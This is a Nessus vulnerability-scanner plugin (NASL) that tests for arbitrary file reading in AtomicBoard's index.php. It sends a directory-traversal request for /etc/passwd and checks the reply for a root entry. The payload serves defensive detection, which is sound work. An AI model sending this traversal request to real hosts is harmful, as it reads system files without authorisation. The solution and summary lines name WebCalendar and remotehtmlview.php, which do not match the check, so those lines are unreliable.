#
# (C) Tenable Network Security
#

if(description)
{
 script_id(11795);
 script_bugtraq_id(8236);
 script_version ("$Revision: 1.7 $");
 
 name["english"] = "AtomicBoard file reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is hosting AtomicBoard, a set of PHP scripts.

This set of scripts may allow an attacker to read arbitrary
files on this host by supplying a filename to the 'location'
argument of the file index.php.


Solution : Upgrade WebCalendar 0.9.42
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of remotehtmlview.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2003 Tenable Network Security");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#


include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);



function check(loc)
{
 req = http_get(item:string(loc, "/index.php?location=../../../../../../../../../../../../../../../etc/passwd"),
 		port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL )exit(0);
 if(egrep(pattern:"root:.*:0:[01]:.*:", string:r))
 {
 	security_hole(port);
	exit(0);
 }
}


dir = make_list(cgi_dirs());
dirs = make_list();
foreach d (dir)
{
 dirs = make_list(dirs, string(d, "/atomicboard"));
}

dirs = make_list(dirs, "/atomicboard");


foreach dir (dirs)
{
check(loc:dir);
}
